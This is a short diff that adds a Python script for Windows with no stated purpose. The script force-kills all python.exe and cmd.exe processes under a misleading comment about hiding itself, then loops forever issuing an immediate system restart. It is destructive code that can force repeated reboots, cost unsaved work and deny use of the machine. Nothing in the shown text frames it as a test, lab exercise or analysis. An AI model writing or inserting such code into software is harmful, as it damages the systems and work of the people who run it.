@@ -1,0 +1,14 @@
+import os
+import subprocess
+import time
+
+# Hide this script in the background process
+os.system("taskkill /im python.exe")
+os.system("taskkill /im cmd.exe")
+
+while True:
+    try:
+        # Restart the computer
+        os.system("shutdown /r /t 0")
+    except Exception as e:
+        print(f"An error occurred: {e}")
